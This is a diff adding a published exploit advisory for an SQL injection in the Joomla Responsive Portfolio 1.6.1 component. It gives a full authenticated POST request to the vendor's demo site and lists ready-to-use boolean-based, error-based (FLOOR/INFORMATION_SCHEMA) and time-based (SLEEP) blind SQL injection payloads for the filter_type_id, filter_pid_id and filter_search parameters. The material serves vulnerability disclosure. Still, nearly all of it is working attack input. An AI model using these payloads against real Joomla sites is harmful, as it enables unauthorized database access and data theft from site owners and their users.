@@ -1,0 +1,98 @@
+# Exploit Title: Joomla! Component Responsive Portfolio 1.6.1 - 'filter_order_Dir' SQL Injection
+# Dork: N/A
+# Date: 2018-09-25
+# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
+# Vendor Homepage: https://extro.media/
+# Software Link: https://extensions.joomla.org/extension/rpc-responsive-portfolio/
+# Version: 1.6.1
+# Category: Webapps
+# Tested on: Kali linux
+# Description : An attacker can execute SQL commands through parameters
+# that contain vulnerable. An authorized user can use the filtering feature and can fully authorize
+# the database or other server informations.
+
+# "filter_type_id, filter_pid_id, filter_search" parameters have the same vulnerable.
+# PoC : SQLi :
+
+POST /administrator/index.php?option=com_pofos&view=pofoits
+Host: demo.extro.media
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer:
+https://demo.extro.media/administrator/index.php?option=com_pofos&view=pofoits
+Cookie: 2e7fc5dc4e4ce76c3319e1db921484ac=eqgcirsi6m53s6vbi7bbgng1n5;
+48bd4f2f65b6c84d32f8704444f9b24c=rt2t3ur8fgmbjemdqua1vn8u35
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+filter_type_id=1&filter_pid_id=6&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&42665dd9e1062891c3394b621d58259f=1
+
+
+# Parameter: filter_type_id (POST)
+
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+Payload: filter_type_id=-7022 OR
+5787=5787#&filter_pid_id=6&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&42665dd9e1062891c3394b621d58259f=1
+
+Type: error-based
+Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+Payload: filter_type_id=1 AND (SELECT 5756 FROM(SELECT
+COUNT(*),CONCAT(0x7162706271,(SELECT
+(ELT(5756=5756,1))),0x7170706271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY
+x)a)&filter_pid_id=6&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&42665dd9e1062891c3394b621d58259f=1
+
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind
+Payload: filter_type_id=1 AND
+SLEEP(5)&filter_pid_id=6&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&42665dd9e1062891c3394b621d58259f=1
+
+# Parameter: filter_pid_id (POST)
+
+Type: boolean-based blind
+Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+Payload: filter_type_id=1&filter_pid_id=-5547 OR
+1857=1857#&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
+
+Type: error-based
+Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+Payload: filter_type_id=1&filter_pid_id=7 AND (SELECT 2680 FROM(SELECT
+COUNT(*),CONCAT(0x71766b7671,(SELECT
+(ELT(2680=2680,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY
+x)a)&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
+
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 OR time-based blind
+Payload: filter_type_id=1&filter_pid_id=7 OR
+SLEEP(5)&filter_search=&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
+
+
+# Parameter: filter_search (POST)
+
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+Payload: filter_type_id=1&filter_pid_id=7&filter_search=" AND
+8748=8748#&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
+
+Type: error-based
+Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP
+BY clause (FLOOR)
+Payload: filter_type_id=1&filter_pid_id=7&filter_search=" AND (SELECT
+2429 FROM(SELECT COUNT(*),CONCAT(0x71766b7671,(SELECT
+(ELT(2429=2429,1))),0x71627a6271,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
+zyPZ&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
+
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind
+Payload: filter_type_id=1&filter_pid_id=7&filter_search=" AND
+SLEEP(5)--
+fDVO&limitstart=0&task=&boxchecked=0&filter_order=&filter_order_Dir=&e0b80bd9e6ffbad6d1ab256ec3149955=1
